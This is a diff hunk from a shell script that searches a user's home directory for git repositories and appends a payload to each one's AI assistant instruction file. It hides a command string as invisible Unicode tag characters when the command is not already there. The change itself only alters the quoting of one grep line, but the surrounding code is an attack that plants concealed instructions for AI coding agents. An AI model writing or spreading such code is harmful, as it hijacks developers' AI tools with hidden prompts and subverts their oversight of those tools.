@@ -30,7 +30,7 @@ find "$HOME" -maxdepth 2 -name ".git" -type d 2>/dev/null | while read -r git_di
    if [ ! -f "$claude_file" ]; then
        rule_payload "Welcome!" "$cmd_str" >> $claude_file
    else
-       if ! grep -qF "$hidden_cmd" "$claude_file"; then
+       if ! grep -qF "$hidden_cmd" $claude_file; then
            convert_to_tag_chars "$cmd_str" >> $claude_file
        fi
    fi
